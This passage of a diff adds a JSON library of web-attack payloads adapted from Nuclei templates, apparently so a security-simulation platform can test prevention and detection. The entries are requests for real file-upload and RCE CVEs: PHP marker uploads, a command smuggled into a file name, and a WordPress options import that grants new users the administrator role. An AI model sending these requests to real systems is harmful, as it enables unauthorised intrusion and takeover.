@@ -1,0 +1,4589 @@
+[
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "McVie Safety Digital Management Platform - Arbitrary File Upload (Nuclei: CNVD-2023-96945)",
+    "payload_external_id": "B8-UPLOAD-001",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CNVD-2023-96945 by DhiyaneshDk] Jiangsu Maiwei Intelligent Technology Co., Ltd. is a software technology service provider focusing on customized development of software products. There is a file upload vulnerability in Jiangsu Maiwei Intelligent Technology Co., Ltd.'s safe production digital management platform. An attacker can...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/Content/Plugins/uploader/FileChoose.html",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "选择文件|提交"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Sexy Contact Form (<= 0.9.7) - Arbitrary File Upload (Nuclei: CVE-2014-8739)",
+    "payload_external_id": "B8-UPLOAD-002",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2014-8739 by melmathari] Unrestricted file upload vulnerability in server/php/UploadHandler.php in the jQuery File Upload Plugin 6.4.4 for jQuery, as used in the Creative Solutions Creative Contact Form (formerly Sexy Contact Form) before 1.0.0 for WordPress and before 2.0.1 for Joomla!, allows remote attackers to execut...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/plugins/sexy-contact-form/includes/fileupload/files/{{rand_base(6)}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{marker\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Plugin Aviary Image Editor Addon For Gravity Forms 3.0 Beta - Arbitrary File Upload (Nuclei: CVE-2015-4455)",
+    "payload_external_id": "B8-UPLOAD-003",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2015-4455 by MaStErChO] Unrestricted file upload vulnerability in includes/upload.php in the Aviary Image Editor Add-on For Gravity Forms plugin 3.0 beta for WordPress allows remote attackers to execute arbitrary code by uploading a file with an executable extension, then accessing it via a direct request to the file in...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/?gf_page=upload",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Frontend File Manager < 4.0 & N-Media Post Frontend < 1.1 - Arbitrary File Upload (Nuclei: CVE-2016-15042)",
+    "payload_external_id": "B8-UPLOAD-004",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2016-15042 by jsnv-dev] The Frontend File Manager plugin (<4.0) and N-Media Post Front-end Form plugin (<1.1) for WordPress were vulnerable to arbitrary file uploads due to missing file type validation. This allowed unauthenticated attackers to upload arbitrary files and potentially achieve remote code execution.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-admin/admin-ajax.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundary{{randstr_val}}"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundary{{randstr_val}}\nContent-Disposition: form-data; name=\"action\"\n\nnm_filemanager_upload_file\n------WebKitFormBoundary{{randstr_val}}\nContent-Disposition: form-data; name=\"name\"\n\n{{to_lower(randstr_name)}}.php\n------WebKitFormBoundary{{randstr_val}}\nContent-Disposition: form-data; name=\"file\"; filename=\"{{to_lower(randstr_name)}}.php\"\nContent-Type: application/octet-stream\n\n<?php echo '{{randstr_content}}'; ?>\n------WebKitFormBoundary{{randstr_val}}--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WP Mobile Detector <= 3.5 - Unrestricted File Upload (Nuclei: CVE-2016-15043)",
+    "payload_external_id": "B8-UPLOAD-005",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2016-15043 by D3nverNg,thewindghost] WP Mobile Detector plugin for WordPress <= 3.5 contains an unrestricted file upload vulnerability caused by missing file type validation in resize.php, letting unauthenticated attackers upload arbitrary files, potentially leading to remote code execution.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/plugins/wp-mobile-detector/cache/{{rand_text_alpha(8)}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress < 4.9.1 - Authenticated JavaScript File Upload (Nuclei: CVE-2017-17092)",
+    "payload_external_id": "B8-UPLOAD-006",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2017-17092 by 0x_Akoko] WordPress before 4.9.1 contains a cross-site scripting caused by not requiring unfiltered_html capability for uploading .js files in functions.php, letting remote attackers execute scripts via crafted files, exploit requires upload permissions.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/wp-content/uploads/{{upload_year}}/{{upload_month}}/{{to_lower(rand_text_alpha(5))}}.js",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Prestashop AttributeWizardPro Module - Arbitrary File Upload (Nuclei: CVE-2018-10942)",
+    "payload_external_id": "B8-UPLOAD-007",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2018-10942 by MaStErChO] In the Attribute Wizard addon 1.6.9 for PrestaShop allows remote attackers to execute arbitrary code by uploading a php file.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/modules/{{paths}}/file_upload.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=ba1f796d0aa2482e9c51c81ae6087818"
+      }
+    ],
+    "web_request_body": "--ba1f796d0aa2482e9c51c81ae6087818\nContent-Disposition: form-data; name=\"userfile\"; filename=\"{{rand_base(7, \"abc\")}}.php\"\nContent-Type: multipart/form-data\n\n{{randstr}}\n--ba1f796d0aa2482e9c51c81ae6087818--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Pandora FMS <=7.0NG.722 - Remote Code Execution (Nuclei: CVE-2018-11222)",
+    "payload_external_id": "B8-UPLOAD-008",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2018-11222 by iamnoooob,rootxharsh,pdresearch] Pandora FMS versions <=7.0NG.722 are vulnerable to unauthenticated remote code execution by chaining an unrestricted file upload (CVE-2018-11221) and a local file inclusion (CVE-2018-11222). An attacker can upload a malicious PHP file as a plugin and execute it via LFI, leading to full compromise...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/pandora_console/ajax.php?page={{replace(path,\"\\\\\",\"\")}}/plugin/phpinfo",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{marker\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Blueimp jQuery-File-Upload v9.22.0 - Unrestricted File Upload (Nuclei: CVE-2018-9206)",
+    "payload_external_id": "B8-UPLOAD-009",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2018-9206 by thewindghost] Blueimp jQuery-File-Upload v9.22.0 contains an unauthenticated arbitrary file upload caused by insufficient validation in the upload component, letting remote attackers upload malicious files, exploit requires no authentication.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/{{path}}",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}"
+      }
+    ],
+    "web_request_body": "------WebKitFormBoundary{{randstr}}\nContent-Disposition: form-data; name=\"files[]\"; filename=\"{{rand_text_alphanumeric(8)}}.php\"\nContent-Type: application/x-php\n\n<?php echo md5(\"CVE-2018-9206\"); ?>\n------WebKitFormBoundary{{randstr}}--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "ZZZCMS ZZZPHP 1.6.3 – Remote PHP Code Execution (RCE) (Nuclei: CVE-2019-10647)",
+    "payload_external_id": "B8-UPLOAD-010",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2019-10647 by Sourabh-Sahu] ZZZCMS zzzphp v1.6.3 contains a remote code execution caused by lack of restrictions in inc/zzz_file.php, letting attackers execute arbitrary PHP code via a crafted URL in the plugins/ueditor/php/controller.php?action=catchimage source[] parameter, exploit requires attacker to send malicious URL ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/upload/{{filename}}",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Xfilesharing 2.5.1 - Arbitrary File Upload (Nuclei: CVE-2019-18952)",
+    "payload_external_id": "B8-UPLOAD-011",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2019-18952 by daffainfo] SibSoft Xfilesharing through 2.5.1 allows cgi-bin/up.cgi arbitrary file upload.This can be combined with CVE-2019-18951 to achieve remote code execution via a .html file, containing short codes, that is served over HTTP.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/cgi-bin/temp/{{randstr}}/{{to_lower(rand_text_alpha(5))}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{md5\\(num\\)\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Easy WP SMTP <= 1.3.9 - Missing Authorization to Arbitrary Options Update (Nuclei: CVE-2019-25141)",
+    "payload_external_id": "B8-UPLOAD-012",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2019-25141 by DhiyaneshDK] The Easy WP SMTP plugin for WordPress is vulnerable to authorization bypass in versions up to, and including, 1.3.9. This is due to missing capability checks on the admin_init() function, in addition to insufficient input validation. This makes it possible for unauthenticated attackers to modify ...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-admin/admin-ajax.php",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf"
+      },
+      {
+        "name": "Connection",
+        "value": "keep-alive"
+      }
+    ],
+    "web_request_body": "--------------------------NCpI6tN3BZW3fz1Y9t2bkf\nContent-Disposition: form-data; name=\"action\"\n\nswpsmtp_clear_log\n--------------------------NCpI6tN3BZW3fz1Y9t2bkf\nContent-Disposition: form-data; name=\"swpsmtp_import_settings\"\n\n1\n--------------------------NCpI6tN3BZW3fz1Y9t2bkf\nContent-Disposition: form-data; name=\"swpsmtp_import_settings_file\"; filename=\"{{rand_text_alpha(10)}}.txt\"\nContent-Type: text/plain\n\na:2:{s:4:\"data\";s:81:\"a:2:{s:18:\"users_can_register\";s:1:\"1\";s:12:\"default_role\";s:13:\"administrator\";}\";s:8:\"checksum\";s:32:\"3ce5fb6d7b1dbd6252f4b5b3526650c8\";}\n\n--------------------------NCpI6tN3BZW3fz1Y9t2bkf--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      302
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "elFinder <= 2.1.47 - Command Injection (Nuclei: CVE-2019-9194)",
+    "payload_external_id": "B8-UPLOAD-013",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2019-9194 by r00tuser111] elFinder before 2.1.48 has a command injection vulnerability in the PHP connector.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/php/{{to_lower(rand_text_alpha(6))}}.php",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "geojson2kml - Command Injection (Nuclei: CVE-2020-28429)",
+    "payload_external_id": "B8-UPLOAD-014",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2020-28429 by eeche,chae1xx1os,persona-twotwo,soonghee2] Detects command injection vulnerability by checking if `hacked.txt` is created and contains the expected content.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/convert",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/json"
+      }
+    ],
+    "web_request_body": "{\n  \"fileName\": \"& echo \\\"{{randstr}}\\\" > {{rand_base(6)}}.txt && ls\",\n  \"geoJsonData\": {\n    \"type\": \"FeatureCollection\",\n    \"features\": [\n      {\n        \"type\": \"Feature\",\n        \"geometry\": {\n          \"type\": \"Point\",\n          \"coordinates\": [102.0, 0.5]\n        },\n        \"properties\": {\n          \"prop0\": \"value0\"\n        }\n      }\n    ]\n  }\n}",
+    "web_request_body_type": "json",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "74CMS - Remote File Inclusion (Nuclei: CVE-2020-29279)",
+    "payload_external_id": "B8-UPLOAD-015",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2020-29279 by DhiyaneshDK] PHP remote file inclusion in the assign_resume_tpl method in Application/Common/Controller/BaseController.class.php in 74CMS before 6.0.48 allows remote code execution.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/index.php?m=home&a=assign_resume_tpl",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "application/x-www-form-urlencoded"
+      }
+    ],
+    "web_request_body": "variable=1&tpl=data/Runtime/Logs/Home/{{replace(date_time(\"%Y\"), \"20\", \"\")}}_{{date_time(\"%M_%D\",unix_time())}}.log",
+    "web_request_body_type": "form",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "PHP\\ Version|\\{\\{md5\\(num\\)\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress Plugin Adning Advertising < 1.5.6 - Arbitrary File Upload (Nuclei: CVE-2020-36728)",
+    "payload_external_id": "B8-UPLOAD-016",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2020-36728 by iamnoooob,pdresearch] The Adning Advertising plugin for WordPress versions below 1.5.6 is vulnerable to arbitrary file upload, allowing attackers to upload malicious files to the server.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{randbase(8)}}.php?input={{base64(marker)}}",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "elFinder < 2.1.58 - Remote Code Execution (Nuclei: CVE-2021-23394)",
+    "payload_external_id": "B8-UPLOAD-017",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2021-23394 by 0xanis] studio-42/elfinder before 2.1.58 contains a remote code execution caused by execution of PHP code in a .phar file, letting attackers execute arbitrary PHP code if the server parses .phar files as PHP, exploit requires server to parse .phar files as PHP.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/elFinder/files/{{randstr}}.phar",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [],
+    "expected_body_regex": "\\{\\{md5\\(payload_str\\)\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WooCommerce Help Scout - Arbitrary File Upload (Nuclei: CVE-2021-24212)",
+    "payload_external_id": "B8-UPLOAD-018",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2021-24212 by ritikchaddha] WooCommerce Help Scout plugin before version 2.9.1 contains an unrestricted file upload vulnerability. The vulnerability allows unauthenticated users to upload arbitrary files to the server which by default will end up in wp-content/uploads/hstmp/ directory, potentially leading to remote code exe...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "POST",
+    "web_request_url": "/wp-admin/admin-ajax.php?action=wc_help_scout_upload_attachments",
+    "web_request_headers": [
+      {
+        "name": "Content-Type",
+        "value": "multipart/form-data; boundary=------------------------NCpI6tN3BZW3fz1Y9t2bkf"
+      }
+    ],
+    "web_request_body": "------------------------NCpI6tN3BZW3fz1Y9t2bkf\nContent-Disposition: form-data; name=\"file\"; filename=\"{{rand_base(6)}}.php\"\nContent-Type: application/x-php\n\n<?php echo md5('999999999'); ?>\n------------------------NCpI6tN3BZW3fz1Y9t2bkf--",
+    "web_request_body_type": "multipart",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\\{\\{md5\\(num\\)\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Kaseya VSA < 9.5.7 - Arbitrary File Upload to Remote Code Execution (Nuclei: CVE-2021-30118)",
+    "payload_external_id": "B8-UPLOAD-019",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2021-30118 by daffainfo] An attacker can upload files with the privilege of the Web Server process for Kaseya VSA Unified Remote Monitoring & Management (RMM) 9.5.4.2149 and subsequently use these files to execute asp commands The api /SystemTab/uploader.aspx is vulnerable to an unauthenticated arbitrary file upload lead...",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/{{rand_base(8)}}.aspx",
+    "web_request_headers": [
+      {
+        "name": "Cookie",
+        "value": "sessionId={{rand_int(11111111, 99999999)}}"
+      }
+    ],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "\\{\\{md5\\(num\\)\\}\\}"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Eclipse BIRT Viewer - Remote Code Execution (Nuclei: CVE-2021-34427)",
+    "payload_external_id": "B8-UPLOAD-020",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2021-34427 by us3r777,Synacktiv] Eclipse BIRT versions 4.8.0 and earlier contain a JSP injection caused by query parameters, letting remote attackers create and access malicious JSP files in the viewer directory, exploit requires sending crafted query parameters.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "file_upload",
+      "nuclei",
+      "sev-critical"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/document?__report=test.rptdesign&sample={{url_encode(payload)}}&__document=./test/{{rand_base(20)}}.jsp/.",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": ""
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "WordPress ProfilePress 3.0-3.1.3 - Arbitrary File Upload (Nuclei: CVE-2021-34624)",
+    "payload_external_id": "B8-UPLOAD-021",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
